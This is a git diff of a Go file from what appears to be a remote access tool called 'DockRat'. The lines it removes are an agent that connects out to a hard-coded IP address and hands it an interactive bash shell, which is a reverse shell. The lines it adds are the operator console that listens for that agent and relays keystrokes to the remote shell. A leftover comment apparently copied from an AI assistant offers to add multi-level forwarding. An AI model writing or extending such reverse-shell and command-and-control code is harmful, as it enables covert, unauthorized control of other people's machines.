@@ -13,10 +13,11 @@ package main
 import (
 	"bufio"
 	"fmt"
+	"io"
 	"net"
+	"os"
 
 	"github.com/Singert/DockRat/core/protocol"
-	"github.com/Singert/DockRat/core/shell"
 )
 
 // func main() {
@@ -77,24 +78,51 @@ import (
 
 // 是否需要我继续为你添加 节点结构 和 多级转发 的逻辑基础？
 
+// === /cmd/admin/main.go ===
+
 func main() {
-	conn, err := net.Dial("tcp", "45.89.233.225:9999")
+	ln, err := net.Listen("tcp", ":9999")
+	if err != nil {
+		panic(err)
+	}
+	fmt.Println("[*] Waiting for agent...")
+
+	conn, err := ln.Accept()
 	if err != nil {
 		panic(err)
 	}
 	defer conn.Close()
-	fmt.Println("[*] Connected to admin.")
+	fmt.Println("[*] Agent connected.")
 
-	scanner := bufio.NewScanner(conn)
-	for scanner.Scan() {
-		msg, err := protocol.Decode(scanner.Bytes())
-		if err != nil {
-			continue
-		}
-		if msg.Type == "cmd" {
-			fmt.Println("[*] Launching interactive shell...")
-			_ = shell.StartShellIO(conn, "bash")
+	stdin := bufio.NewScanner(os.Stdin)
+	for {
+		fmt.Print("Admin> ")
+		if !stdin.Scan() {
 			break
 		}
+		line := stdin.Text()
+		if line == "shell" {
+			msg := protocol.NewCommand("")
+			data, _ := protocol.EncodeWithNewline(msg)
+			conn.Write(data)
+			fmt.Println("[*] Switched to interactive shell. Press Ctrl+C to quit.")
+			startInteractiveShell(conn)
+			fmt.Println("[*] Returned from shell session.")
+			continue
+		}
+		fmt.Println("Unknown command. Try 'shell'.")
 	}
+}
+
+func startInteractiveShell(conn net.Conn) {
+	done := make(chan struct{})
+	go func() {
+		_, _ = io.Copy(conn, os.Stdin)
+		done <- struct{}{}
+	}()
+	go func() {
+		_, _ = io.Copy(os.Stdout, conn)
+		done <- struct{}{}
+	}()
+	<-done
 }
